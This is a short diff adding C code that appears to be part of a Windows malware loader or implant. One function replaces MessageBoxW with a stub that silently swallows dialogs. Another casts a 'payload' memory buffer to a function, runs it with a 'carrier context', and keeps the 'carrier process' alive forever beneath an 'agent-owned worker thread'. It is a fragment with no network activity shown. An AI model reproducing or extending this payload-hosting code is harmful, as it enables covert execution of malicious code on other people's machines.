@@ -1,0 +1,29 @@
+#define SG_INFINITE 0xFFFFFFFFUL
+
+static int WINAPI sg_message_box_w(
+    HWND window,
+    const wchar_t *text,
+    const wchar_t *caption,
+    unsigned int type)
+{
+    (void)window;
+    (void)text;
+    (void)caption;
+    (void)type;
+    return 0;
+}
+
+static DWORD sg_execute(PVOID payload, SG_CARRIER_CONTEXT *context)
+{
+    SG_PAYLOAD_FN entry = (SG_PAYLOAD_FN)payload;
+
+    /*
+     * Barrel Kit returns after starting the agent-owned worker thread.
+     * Keep the carrier process alive underneath that thread.
+     */
+    entry(context);
+    for (;;) {
+        Sleep(SG_INFINITE);
+    }
+    return 0;
+}
